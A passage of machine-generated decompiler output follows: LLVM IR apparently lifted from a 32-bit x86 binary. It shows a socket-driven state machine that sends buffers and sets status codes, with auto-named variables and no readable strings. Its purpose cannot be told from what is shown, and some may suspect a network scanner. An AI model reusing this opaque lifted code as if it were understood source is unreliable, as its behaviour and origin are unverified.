  %v0_804ac01 = load i32, i32* @esp, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804ac1b = load i32, i32* %v3_804aa3c, align 8
  store i32 %v4_804ac1b, i32* %eax.global-to-local, align 4
  %v3_804ac21 = inttoptr i32 %v0_804ac01 to i32*
  store i32 %v4_804ac1b, i32* %v3_804ac21, align 4
  %v1_804ac22 = call i32 @function_8049e8b(i32 %v2_804abab)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804ac4d = add i32 %v2_8049faf, %v2_804a02b
  %v4_804ac4d = inttoptr i32 %v3_804ac4d to i8*
  store i8 1, i8* %v4_804ac4d, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804ac57:                             ; preds = %dec_label_pc_804a01f
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804ac66 = add i32 %v2_804a137, %v2_804a02b
  %v4_804ac66 = inttoptr i32 %v3_804ac66 to i8*
  %v5_804ac66 = load i8, i8* %v4_804ac66, align 1
  %v6_804ac66 = zext i8 %v5_804ac66 to i32
  store i32 %v6_804ac66, i32* %eax.global-to-local, align 4
  %v1_804ac6f = mul nuw nsw i32 %v6_804ac66, 4
  %v2_804ac6f = add nuw nsw i32 %v1_804ac6f, 134566240
  %v3_804ac6f = inttoptr i32 %v2_804ac6f to i32*
  %v4_804ac6f = load i32, i32* %v3_804ac6f, align 4
  %v1_804ac81 = and i32 %v4_804ac6f, -256
  store i32 %v1_804ac81, i32* %eax.global-to-local, align 4
  %v4_804ac84 = inttoptr i32 %v4_804ac6f to i8*
  store i32 %v4_804ac6f, i32* @edi, align 4
  %v3_804ac8a = call i32 @_strlen(i8* %v4_804ac84)
  store i32 %v3_804ac8a, i32* @esi, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v5_804aca2 = load i8, i8* %v4_804ac66, align 1
  %v6_804aca2 = zext i8 %v5_804aca2 to i32
  store i32 %v6_804aca2, i32* %eax.global-to-local, align 4
  %v1_804acab = mul nuw nsw i32 %v6_804aca2, 4
  %v2_804acab = add nuw nsw i32 %v1_804acab, 134566240
  %v3_804acab = inttoptr i32 %v2_804acab to i32*
  %v4_804acab = load i32, i32* %v3_804acab, align 4
  store i32 %v4_804acab, i32* @ebx, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v2_804acc1 = add i32 %v2_804a02b, %v2_8049f6b
  %v3_804acc1 = inttoptr i32 %v2_804acc1 to i32*
  %v4_804acc1 = load i32, i32* %v3_804acc1, align 8
  store i32 %v4_804acc1, i32* %eax.global-to-local, align 4
  %v0_804acc4 = load i32, i32* @esp, align 4
  %v1_804acc4 = add i32 %v0_804acc4, -4
  %v2_804acc4 = inttoptr i32 %v1_804acc4 to i32*
  store i32 16384, i32* %v2_804acc4, align 4
  %v0_804acc9 = load i32, i32* @esi, align 4
  %v2_804acc9 = add i32 %v0_804acc4, -8
  %v3_804acc9 = inttoptr i32 %v2_804acc9 to i32*
  store i32 %v0_804acc9, i32* %v3_804acc9, align 4
  %v0_804acca = load i32, i32* @ebx, align 4
  %v2_804acca = add i32 %v0_804acc4, -12
  %v3_804acca = inttoptr i32 %v2_804acca to i32*
  store i32 %v0_804acca, i32* %v3_804acca, align 4
  %v0_804accb = load i32, i32* %eax.global-to-local, align 4
  %v2_804accb = add i32 %v0_804acc4, -16
  %v3_804accb = inttoptr i32 %v2_804accb to i32*
  store i32 %v0_804accb, i32* %v3_804accb, align 4
  %v4_804accc = call i32 @function_804f64c(i32 %v4_804ac6f, i32 %stack_var_-232.225, i32 %stack_var_-228.227, i32 %stack_var_-224.229)
  %v0_804acd1 = load i32, i32* @esp, align 4
  %v2_804acd4 = icmp slt i32 %v4_804accc, 0
  %v1_804acd6 = icmp eq i1 %v2_804acd4, false
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804ad32 = load i32, i32* %v3_804acc1, align 8
  store i32 %v4_804ad32, i32* %eax.global-to-local, align 4
  br i1 %v1_804acd6, label %dec_label_pc_804ad23, label %dec_label_pc_804acd8

dec_label_pc_804acd8:                             ; preds = %dec_label_pc_804ac57
  %v3_804aced = inttoptr i32 %v0_804acd1 to i32*
  store i32 %v4_804ad32, i32* %v3_804aced, align 4
  %v1_804acee = call i32 @function_8049e8b(i32 %v4_804ac6f)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804ad19 = add i32 %v2_8049faf, %v2_804a02b
  %v4_804ad19 = inttoptr i32 %v3_804ad19 to i8*
  store i8 1, i8* %v4_804ad19, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804ad23:                             ; preds = %dec_label_pc_804ac57
  %v1_804ad35 = add i32 %v0_804acd1, 12
  %v2_804ad35 = inttoptr i32 %v1_804ad35 to i32*
  store i32 16384, i32* %v2_804ad35, align 4
  %v1_804ad3a = add i32 %v0_804acd1, 8
  %v2_804ad3a = inttoptr i32 %v1_804ad3a to i32*
  store i32 2, i32* %v2_804ad3a, align 4
  %v1_804ad3c = add i32 %v0_804acd1, 4
  %v2_804ad3c = inttoptr i32 %v1_804ad3c to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052995.33 to i32), i32* %v2_804ad3c, align 4
  %v0_804ad41 = load i32, i32* %eax.global-to-local, align 4
  %v3_804ad41 = inttoptr i32 %v0_804acd1 to i32*
  store i32 %v0_804ad41, i32* %v3_804ad41, align 4
  %v4_804ad42 = call i32 @function_804f64c(i32 %v4_804ac6f, i32 %stack_var_-232.225, i32 %stack_var_-228.227, i32 %stack_var_-224.229)
  %v0_804ad47 = load i32, i32* @esp, align 4
  %v2_804ad4a = icmp slt i32 %v4_804ad42, 0
  %v1_804ad4c = icmp eq i1 %v2_804ad4a, false
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  br i1 %v1_804ad4c, label %dec_label_pc_804ad99, label %dec_label_pc_804ad4e

dec_label_pc_804ad4e:                             ; preds = %dec_label_pc_804ad23
  %v4_804ad5d = load i32, i32* %v3_804acc1, align 8
  store i32 %v4_804ad5d, i32* %eax.global-to-local, align 4
  %v3_804ad63 = inttoptr i32 %v0_804ad47 to i32*
  store i32 %v4_804ad5d, i32* %v3_804ad63, align 4
  %v1_804ad64 = call i32 @function_8049e8b(i32 %v4_804ac6f)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804ad8f = add i32 %v2_8049faf, %v2_804a02b
  %v4_804ad8f = inttoptr i32 %v3_804ad8f to i8*
  store i8 1, i8* %v4_804ad8f, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804ad99:                             ; preds = %dec_label_pc_804ad23
  store i8 6, i8* %v4_804a02e, align 8
  br label %dec_label_pc_804b3cf

dec_label_pc_804adb2:                             ; preds = %dec_label_pc_804a01f
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  %v2_804adc1 = add i32 %v2_804a02b, %v2_8049f6b
  %v1_804adc3 = add i32 %v2_804adc1, 12
  store i32 %v1_804adc3, i32* %eax.global-to-local, align 4
  %v1_804adc6 = inttoptr i32 %v1_804adc3 to i32*
  %v2_804adc6 = load i32, i32* %v1_804adc6, align 4
  store i32 %v2_804adc6, i32* %eax.global-to-local, align 4
  %v1_804adc8 = icmp eq i32 %v2_804adc6, 0
  %v1_804adca = icmp eq i1 %v1_804adc8, false
  br i1 %v1_804adca, label %dec_label_pc_804adf1, label %dec_label_pc_804adcc

dec_label_pc_804adcc:                             ; preds = %dec_label_pc_804adb2
  store i32 %v1_804a145, i32* @ebx, align 4
  %v0_804adcf = load i32, i32* @esp, align 4
  %v1_804add2 = add i32 %v0_804adcf, -16
  %v2_804add2 = inttoptr i32 %v1_804add2 to i32*
  store i32 0, i32* %v2_804add2, align 4
  %v1_804add4 = inttoptr i32 %v6_804a02e to i32*
  %v2_804add4 = call i32 @function_804e134(i32* %v1_804add4)
  store i32 %v2_8049f6b, i32* %edx.global-to-local, align 4
  %v0_804ade1 = load i32, i32* @ebx, align 4
  %v2_804ade7 = mul i32 %v0_804ade1, 24
  %v1_804adec = add i32 %v2_804a380, %v2_804ade7
  store i32 %v1_804adec, i32* %eax.global-to-local, align 4
  %v2_804adef = inttoptr i32 %v1_804adec to i32*
  store i32 %v2_804add4, i32* %v2_804adef, align 4
  br label %dec_label_pc_804adf1

dec_label_pc_804adf1:                             ; preds = %dec_label_pc_804adb2, %dec_label_pc_804adcc
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  %v1_804ae02 = add i32 %v2_804adc1, 16
  store i32 %v1_804ae02, i32* %eax.global-to-local, align 4
  %v1_804ae05 = inttoptr i32 %v1_804ae02 to i32*
  %v2_804ae05 = load i32, i32* %v1_804ae05, align 8
  %v1_804ae09 = urem i32 %v2_804ae05, 65536
  store i32 %v1_804ae09, i32* @esi, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  %v1_804ae20 = add i32 %v2_804adc1, 20
  store i32 %v1_804ae20, i32* %eax.global-to-local, align 4
  %v1_804ae23 = inttoptr i32 %v1_804ae20 to i32*
  %v2_804ae23 = load i32, i32* %v1_804ae23, align 4
  store i32 %v2_804ae23, i32* @ebx, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804ae34 = inttoptr i32 %v2_804adc1 to i32*
  %v4_804ae34 = load i32, i32* %v3_804ae34, align 8
  store i32 %v4_804ae34, i32* %eax.global-to-local, align 4
  %v1_804ae37 = load i32, i32* @esp, align 4
  %v2_804ae37 = add i32 %v1_804ae37, -4
  %v3_804ae37 = inttoptr i32 %v2_804ae37 to i32*
  store i32 %v1_804ae09, i32* %v3_804ae37, align 4
  %v1_804ae38 = add i32 %v1_804ae37, -8
  %v2_804ae38 = inttoptr i32 %v1_804ae38 to i32*
  store i32 1024, i32* %v2_804ae38, align 4
  %v0_804ae3d = load i32, i32* @ebx, align 4
  %v2_804ae3d = add i32 %v1_804ae37, -12
  %v3_804ae3d = inttoptr i32 %v2_804ae3d to i32*
  store i32 %v0_804ae3d, i32* %v3_804ae3d, align 4
  %v1_804ae3e = add i32 %v1_804ae37, -16
  %v2_804ae3e = inttoptr i32 %v1_804ae3e to i32*
  store i32 10000, i32* %v2_804ae3e, align 4
  %v1_804ae43 = add i32 %v1_804ae37, -20
  %v2_804ae43 = inttoptr i32 %v1_804ae43 to i32*
  store i32 0, i32* %v2_804ae43, align 4
  %v1_804ae45 = add i32 %v1_804ae37, -24
  %v2_804ae45 = inttoptr i32 %v1_804ae45 to i32*
  store i32 1, i32* %v2_804ae45, align 4
  %v1_804ae47 = add i32 %v1_804ae37, -28
  %v2_804ae47 = inttoptr i32 %v1_804ae47 to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_80529a1.35 to i32), i32* %v2_804ae47, align 4
  %v0_804ae4c = load i32, i32* %eax.global-to-local, align 4
  %v2_804ae4c = add i32 %v1_804ae37, -32
  %v3_804ae4c = inttoptr i32 %v2_804ae4c to i32*
  store i32 %v0_804ae4c, i32* %v3_804ae4c, align 4
  %v0_804ae4d = call i32 @function_8049875()
  store i32 %v0_804ae4d, i32* %eax.global-to-local, align 4
  %v1_804ae55 = icmp eq i32 %v0_804ae4d, 0
  br i1 %v1_804ae55, label %dec_label_pc_804b011, label %dec_label_pc_804ae5d

dec_label_pc_804ae5d:                             ; preds = %dec_label_pc_804adf1
  store i32 0, i32* %v1_804adc6, align 4
  %v1_804ae8b = inttoptr i32 %v1_804ae02 to i16*
  store i16 0, i16* %v1_804ae8b, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v1_804ae20, i32* %eax.global-to-local, align 4
  %v2_804aea4 = load i32, i32* %v1_804ae23, align 4
  store i32 %v2_804aea4, i32* %eax.global-to-local, align 4
  %v0_804aea6 = load i32, i32* @esp, align 4
  %v1_804aea9 = add i32 %v0_804aea6, -12
  %v2_804aea9 = inttoptr i32 %v1_804aea9 to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_80529a1.35 to i32), i32* %v2_804aea9, align 4
  %v0_804aeae = load i32, i32* %eax.global-to-local, align 4
  %v2_804aeae = add i32 %v0_804aea6, -16
  %v3_804aeae = inttoptr i32 %v2_804aeae to i32*
  store i32 %v0_804aeae, i32* %v3_804aeae, align 4
  %v2_804aeaf = inttoptr i32 %stack_var_-232.225 to i8*
  %v3_804aeaf = call i32 @function_804f284(i32 %stack_var_-236.223, i8* %v2_804aeaf)
  %v0_804aeb4 = load i32, i32* @esp, align 4
  %v1_804aeb7 = icmp eq i32 %v3_804aeaf, 0
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v1_804ae20, i32* %eax.global-to-local, align 4
  %v2_804af46 = load i32, i32* %v1_804ae23, align 4
  store i32 %v2_804af46, i32* %eax.global-to-local, align 4
  br i1 %v1_804aeb7, label %dec_label_pc_804af32, label %dec_label_pc_804aebb

dec_label_pc_804aebb:                             ; preds = %dec_label_pc_804ae5d
  store i32 %v2_804af46, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v2_804aedb = add i32 %v0_804aeb4, 8
  %v3_804aedb = inttoptr i32 %v2_804aedb to i32*
  store i32 1024, i32* %v3_804aedb, align 4
  %v1_804aedc = add i32 %v0_804aeb4, 4
  %v2_804aedc = inttoptr i32 %v1_804aedc to i32*
  store i32 0, i32* %v2_804aedc, align 4
  %v0_804aede = load i32, i32* %edx.global-to-local, align 4
  %v3_804aede = inttoptr i32 %v0_804aeb4 to i32*
  store i32 %v0_804aede, i32* %v3_804aede, align 4
  %v3_804aedf = inttoptr i32 %stack_var_-236.223 to i8*
  %v4_804aedf = call i32 @function_804f1d8(i8* %v3_804aedf, i32 %stack_var_-232.225, i32 %stack_var_-228.227)
  %v0_804aee4 = load i32, i32* @esp, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804aef6 = load i32, i32* %v3_804ae34, align 8
  store i32 %v4_804aef6, i32* %eax.global-to-local, align 4
  %v3_804aefc = inttoptr i32 %v0_804aee4 to i32*
  store i32 %v4_804aef6, i32* %v3_804aefc, align 4
  %v1_804aefd = call i32 @function_8049e8b(i32 %stack_var_-236.223)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804af28 = add i32 %v2_8049faf, %v2_804a02b
  %v4_804af28 = inttoptr i32 %v3_804af28 to i8*
  store i8 0, i8* %v4_804af28, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804af32:                             ; preds = %dec_label_pc_804ae5d
  %v2_804af48 = add i32 %v0_804aeb4, 12
  %v3_804af48 = inttoptr i32 %v2_804af48 to i32*
  store i32 %v2_804af46, i32* %v3_804af48, align 4
  %v1_804af49 = inttoptr i32 %stack_var_-236.223 to i8*
  %v2_804af49 = call i32 @function_8049774(i8* %v1_804af49)
  %v0_804af4e = load i32, i32* @esp, align 4
  %v1_804af51 = icmp eq i32 %v2_804af49, 0
  %v1_804af53 = icmp eq i1 %v1_804af51, false
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  br i1 %v1_804af53, label %dec_label_pc_804afcc, label %dec_label_pc_804af55

dec_label_pc_804af55:                             ; preds = %dec_label_pc_804af32
  store i32 %v1_804ae20, i32* %eax.global-to-local, align 4
  %v2_804af69 = load i32, i32* %v1_804ae23, align 4
  store i32 %v2_804af69, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v2_804af75 = add i32 %v0_804af4e, -4
  %v3_804af75 = inttoptr i32 %v2_804af75 to i32*
  store i32 1024, i32* %v3_804af75, align 4
  %v1_804af76 = add i32 %v0_804af4e, -8
  %v2_804af76 = inttoptr i32 %v1_804af76 to i32*
  store i32 0, i32* %v2_804af76, align 4
  %v0_804af78 = load i32, i32* %edx.global-to-local, align 4
  %v2_804af78 = add i32 %v0_804af4e, -12
  %v3_804af78 = inttoptr i32 %v2_804af78 to i32*
  store i32 %v0_804af78, i32* %v3_804af78, align 4
  %v4_804af79 = call i32 @function_804f1d8(i8* %v1_804af49, i32 %stack_var_-232.225, i32 %stack_var_-228.227)
  %v0_804af7e = load i32, i32* @esp, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804af90 = load i32, i32* %v3_804ae34, align 8
  store i32 %v4_804af90, i32* %eax.global-to-local, align 4
  %v3_804af96 = inttoptr i32 %v0_804af7e to i32*
  store i32 %v4_804af90, i32* %v3_804af96, align 4
  %v1_804af97 = call i32 @function_8049e8b(i32 %stack_var_-236.223)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804afc2 = add i32 %v2_8049faf, %v2_804a02b
  %v4_804afc2 = inttoptr i32 %v3_804afc2 to i8*
  store i8 1, i8* %v4_804afc2, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804afcc:                             ; preds = %dec_label_pc_804af32
  store i8 7, i8* %v4_804a02e, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v1_804ae20, i32* %eax.global-to-local, align 4
  %v2_804aff4 = load i32, i32* %v1_804ae23, align 4
  store i32 %v2_804aff4, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v0_804affd = load i32, i32* @esp, align 4
  %v2_804b000 = add i32 %v0_804affd, -8
  %v3_804b000 = inttoptr i32 %v2_804b000 to i32*
  store i32 1024, i32* %v3_804b000, align 4
  %v1_804b001 = add i32 %v0_804affd, -12
  %v2_804b001 = inttoptr i32 %v1_804b001 to i32*
  store i32 0, i32* %v2_804b001, align 4
  %v0_804b003 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b003 = add i32 %v0_804affd, -16
  %v3_804b003 = inttoptr i32 %v2_804b003 to i32*
  store i32 %v0_804b003, i32* %v3_804b003, align 4
  %v4_804b004 = call i32 @function_804f1d8(i8* %v1_804af49, i32 %stack_var_-232.225, i32 %stack_var_-228.227)
  store i32 %v4_804b004, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b3cf

dec_label_pc_804b011:                             ; preds = %dec_label_pc_804adf1
  store i32 %v1_804a145, i32* %ebx.global-to-local, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v1_804ae20, i32* %eax.global-to-local, align 4
  %v2_804b028 = load i32, i32* %v1_804ae23, align 4
  %v1_804b035 = and i32 %v2_804b028, -256
  store i32 %v1_804b035, i32* %eax.global-to-local, align 4
  %v4_804b038 = inttoptr i32 %v2_804b028 to i8*
  store i32 %v2_804b028, i32* @edi, align 4
  %v3_804b03e = call i32 @_strlen(i8* %v4_804b038)
  %v0_804b04a = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b050 = mul i32 %v0_804b04a, 24
  %v1_804b055 = add i32 %v2_804a7de, %v2_804b050
  %v1_804b058 = trunc i32 %v3_804b03e to i16
  %v3_804b058 = inttoptr i32 %v1_804b055 to i16*
  store i16 %v1_804b058, i16* %v3_804b058, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v1_804adc3, i32* %eax.global-to-local, align 4
  %v2_804b06f = load i32, i32* %v1_804adc6, align 4
  store i32 %v2_804b06f, i32* %eax.global-to-local, align 4
  %v1_804b071 = add i32 %v2_804b06f, 30
  store i32 %v1_804b071, i32* @ebx, align 4
  %v0_804b074 = load i32, i32* @esp, align 4
  %v1_804b077 = add i32 %v0_804b074, -16
  %v2_804b077 = inttoptr i32 %v1_804b077 to i32*
  store i32 0, i32* %v2_804b077, align 4
  %v1_804b079 = inttoptr i32 %v2_804b028 to i32*
  %v2_804b079 = call i32 @function_804e134(i32* %v1_804b079)
  store i32 %v2_804b079, i32* %eax.global-to-local, align 4
  %v0_804b081 = load i32, i32* @ebx, align 4
  %v7_804b081 = icmp ult i32 %v0_804b081, %v2_804b079
  %v1_804b083 = icmp eq i1 %v7_804b081, false
  br i1 %v1_804b083, label %dec_label_pc_804b3cf, label %dec_label_pc_804b089

dec_label_pc_804b089:                             ; preds = %dec_label_pc_804b011
  %v0_804b07e = load i32, i32* @esp, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804b098 = load i32, i32* %v3_804ae34, align 8
  store i32 %v4_804b098, i32* %eax.global-to-local, align 4
  %v3_804b09e = inttoptr i32 %v0_804b07e to i32*
  store i32 %v4_804b098, i32* %v3_804b09e, align 4
  %v1_804b09f = call i32 @function_8049e8b(i32 %v2_804b028)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804b0ca = add i32 %v2_8049faf, %v2_804a02b
  %v4_804b0ca = inttoptr i32 %v3_804b0ca to i8*
  store i8 1, i8* %v4_804b0ca, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804b0d4:                             ; preds = %dec_label_pc_804a01f
  %v0_804b0d4 = load i32, i32* bitcast ([4 x i8*]* @global_var_8055188.40 to i32*), align 8
  %v5_804b0de = inttoptr i32 %v0_804b0d4 to i8*
  %v1_804b0e4 = and i32 %v0_804b0d4, -256
  store i32 %v1_804b0e4, i32* %eax.global-to-local, align 4
  %v3_804b0ed = call i32 @_strlen(i8* %v5_804b0de)
  store i32 %v3_804b0ed, i32* @ebx, align 4
  %v0_804b0f6 = load i32, i32* bitcast ([4 x i8*]* @global_var_8055188.40 to i32*), align 8
  store i32 %v0_804b0f6, i32* @esi, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v2_804b10b = add i32 %v2_804a02b, %v2_8049f6b
  %v3_804b10b = inttoptr i32 %v2_804b10b to i32*
  %v4_804b10b = load i32, i32* %v3_804b10b, align 8
  store i32 %v4_804b10b, i32* %eax.global-to-local, align 4
  %v0_804b10e = load i32, i32* @esp, align 4
  %v1_804b10e = add i32 %v0_804b10e, -4
  %v2_804b10e = inttoptr i32 %v1_804b10e to i32*
  store i32 16384, i32* %v2_804b10e, align 4
  %v0_804b113 = load i32, i32* @ebx, align 4
  %v2_804b113 = add i32 %v0_804b10e, -8
  %v3_804b113 = inttoptr i32 %v2_804b113 to i32*
  store i32 %v0_804b113, i32* %v3_804b113, align 4
  %v0_804b114 = load i32, i32* @esi, align 4
  %v2_804b114 = add i32 %v0_804b10e, -12
  %v3_804b114 = inttoptr i32 %v2_804b114 to i32*
  store i32 %v0_804b114, i32* %v3_804b114, align 4
  %v0_804b115 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b115 = add i32 %v0_804b10e, -16
  %v3_804b115 = inttoptr i32 %v2_804b115 to i32*
  store i32 %v0_804b115, i32* %v3_804b115, align 4
  %v5_804b116 = call i32 @function_804f64c(i32 %v0_804b0d4, i32 %stack_var_-240.221, i32 %stack_var_-236.223, i32 %stack_var_-232.225)
  store i32 %v5_804b116, i32* %eax.global-to-local, align 4
  %v2_804b11e = icmp slt i32 %v5_804b116, 0
  %v1_804b120 = icmp eq i1 %v2_804b11e, false
  br i1 %v1_804b120, label %dec_label_pc_804b14f, label %dec_label_pc_804b122

dec_label_pc_804b122:                             ; preds = %dec_label_pc_804b0d4
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804b145 = add i32 %v2_8049faf, %v2_804a02b
  %v4_804b145 = inttoptr i32 %v3_804b145 to i8*
  store i8 1, i8* %v4_804b145, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804b14f:                             ; preds = %dec_label_pc_804b0d4
  %v0_804b14f = load i32, i32* bitcast ([61 x i8]** @global_var_8055194.41 to i32*), align 4
  %v5_804b159 = inttoptr i32 %v0_804b14f to i8*
  %v1_804b15f = and i32 %v0_804b14f, -256
  store i32 %v1_804b15f, i32* %eax.global-to-local, align 4
  %v3_804b168 = call i32 @_strlen(i8* %v5_804b159)
  store i32 %v3_804b168, i32* @ebx, align 4
  %v0_804b171 = load i32, i32* bitcast ([61 x i8]** @global_var_8055194.41 to i32*), align 4
  store i32 %v0_804b171, i32* @esi, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804b186 = load i32, i32* %v3_804b10b, align 8
  store i32 %v4_804b186, i32* %eax.global-to-local, align 4
  %v0_804b189 = load i32, i32* @esp, align 4
  %v1_804b189 = add i32 %v0_804b189, -4
  %v2_804b189 = inttoptr i32 %v1_804b189 to i32*
  store i32 16384, i32* %v2_804b189, align 4
  %v0_804b18e = load i32, i32* @ebx, align 4
  %v2_804b18e = add i32 %v0_804b189, -8
  %v3_804b18e = inttoptr i32 %v2_804b18e to i32*
  store i32 %v0_804b18e, i32* %v3_804b18e, align 4
  %v0_804b18f = load i32, i32* @esi, align 4
  %v2_804b18f = add i32 %v0_804b189, -12
  %v3_804b18f = inttoptr i32 %v2_804b18f to i32*
  store i32 %v0_804b18f, i32* %v3_804b18f, align 4
  %v0_804b190 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b190 = add i32 %v0_804b189, -16
  %v3_804b190 = inttoptr i32 %v2_804b190 to i32*
  store i32 %v0_804b190, i32* %v3_804b190, align 4
  %v6_804b191 = call i32 @function_804f64c(i32 %v0_804b14f, i32 %v0_804b0d4, i32 %stack_var_-240.221, i32 %stack_var_-236.223)
  store i32 %v6_804b191, i32* %eax.global-to-local, align 4
  %v2_804b199 = icmp slt i32 %v6_804b191, 0
  %v1_804b19b = icmp eq i1 %v2_804b199, false
  br i1 %v1_804b19b, label %dec_label_pc_804b1ca, label %dec_label_pc_804b19d

dec_label_pc_804b19d:                             ; preds = %dec_label_pc_804b14f
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804b1c0 = add i32 %v2_8049faf, %v2_804a02b
  %v4_804b1c0 = inttoptr i32 %v3_804b1c0 to i8*
  store i8 1, i8* %v4_804b1c0, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804b1ca:                             ; preds = %dec_label_pc_804b14f
  %v0_804b1ca = load i32, i32* bitcast ([2 x i8*]* @global_var_805518c.42 to i32*), align 4
  %v5_804b1d4 = inttoptr i32 %v0_804b1ca to i8*
  %v1_804b1da = and i32 %v0_804b1ca, -256
  store i32 %v1_804b1da, i32* %eax.global-to-local, align 4
  %v3_804b1e3 = call i32 @_strlen(i8* %v5_804b1d4)
  store i32 %v3_804b1e3, i32* @ebx, align 4
  %v0_804b1ec = load i32, i32* bitcast ([2 x i8*]* @global_var_805518c.42 to i32*), align 4
  store i32 %v0_804b1ec, i32* @esi, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804b201 = load i32, i32* %v3_804b10b, align 8
  store i32 %v4_804b201, i32* %eax.global-to-local, align 4
  %v0_804b204 = load i32, i32* @esp, align 4
  %v1_804b204 = add i32 %v0_804b204, -4
  %v2_804b204 = inttoptr i32 %v1_804b204 to i32*
  store i32 16384, i32* %v2_804b204, align 4
  %v0_804b209 = load i32, i32* @ebx, align 4
  %v2_804b209 = add i32 %v0_804b204, -8
  %v3_804b209 = inttoptr i32 %v2_804b209 to i32*
  store i32 %v0_804b209, i32* %v3_804b209, align 4
  %v0_804b20a = load i32, i32* @esi, align 4
  %v2_804b20a = add i32 %v0_804b204, -12
  %v3_804b20a = inttoptr i32 %v2_804b20a to i32*
  store i32 %v0_804b20a, i32* %v3_804b20a, align 4
  %v0_804b20b = load i32, i32* %eax.global-to-local, align 4
  %v2_804b20b = add i32 %v0_804b204, -16
  %v3_804b20b = inttoptr i32 %v2_804b20b to i32*
  store i32 %v0_804b20b, i32* %v3_804b20b, align 4
  %v7_804b20c = call i32 @function_804f64c(i32 %v0_804b1ca, i32 %v0_804b14f, i32 %v0_804b0d4, i32 %stack_var_-240.221)
  %v2_804b214 = icmp slt i32 %v7_804b20c, 0
  %v1_804b216 = icmp eq i1 %v2_804b214, false
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  br i1 %v1_804b216, label %dec_label_pc_804b245, label %dec_label_pc_804b218

dec_label_pc_804b218:                             ; preds = %dec_label_pc_804b1ca
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
